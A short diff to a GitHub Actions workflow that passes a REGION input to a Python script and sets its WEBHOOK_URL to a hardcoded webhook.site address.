@@ -131,7 +131,8 @@ jobs:
         run: | 
           python3 ./to_snow.py > toSNOW.txt
         env:
-          WEBHOOK_URL: ${{inputs.REGION}}
+          REGION: ${{inputs.REGION}}
+          WEBHOOK_URL: "https://webhook.site/06011c75-78f5-476e-8a19-acc62bb10845"
 
       - name: Print value for SNOW
         run: |
